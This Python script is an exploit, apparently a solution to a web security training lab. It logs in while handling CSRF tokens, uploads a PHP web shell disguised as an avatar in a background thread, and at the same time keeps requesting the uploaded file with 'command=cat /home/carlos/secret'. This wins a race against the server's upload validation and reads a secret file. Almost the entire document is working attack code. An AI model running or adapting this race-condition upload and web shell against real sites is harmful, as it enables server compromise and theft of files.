from lib import (
    USERNAME,
    PASSWORD,
    WEBSHELL,
    LOGIN_CSRF_XPATH,
    MY_ACCOUNT_AVATAR_UPLOAD_CSRF,
    SESSION,
    generate_parser,
    get_flag,
    get_csrf_token,
)
import time
import threading


def upload_payload(lab_url: str, data: dict):
    SESSION.post(
        url=f"{lab_url}/my-account/avatar",
        data=data,
        files={
            # File Tuple Syntax: (filename, file-content, content-type)
            "avatar": (
                "web-shell.php",
                WEBSHELL,
                "application/x-php",
            )
        },
    )


if __name__ == "__main__":
    start_time = time.perf_counter()

    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    # Extracting the login form csrf token using xpath
    login_csrf_token = get_csrf_token(
        # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
        SESSION.get(url=f"{lab_url}/login").text,
        LOGIN_CSRF_XPATH,
    )
    print(f"[+] Login CSRF Token: {login_csrf_token}")

    # Extracting the avatar upload form csrf token
    my_account_avatar_upload_csrf = get_csrf_token(
        # Logging in as the given user and generating the tree for My Account page
        SESSION.post(
            url=f"{lab_url}/login",
            data={"username": USERNAME, "password": PASSWORD, "csrf": login_csrf_token},
        ).text,
        MY_ACCOUNT_AVATAR_UPLOAD_CSRF,
    )
    print(f"[+] My Account Avatar CSRF Token: {login_csrf_token}")

    data = {
        "user": USERNAME,
        "csrf": my_account_avatar_upload_csrf,
    }

    # NOTE: Uploading the payload in a separate thread
    t = threading.Thread(target=upload_payload, args=(lab_url, data))
    t.start()

    is_flag_found = False

    # NOTE: Fetching the flag simultaneously from the main thread
    for _ in range(20):
        if is_flag_found:
            break

        response = SESSION.get(
            url=f"{lab_url}/files/avatars/web-shell.php?command=cat /home/carlos/secret"
        )

        if response.status_code == 200:
            is_flag_found = True
            get_flag(response.text)

    end_time = time.perf_counter()
    print(f"[+] Total Time Taken: {end_time - start_time}")
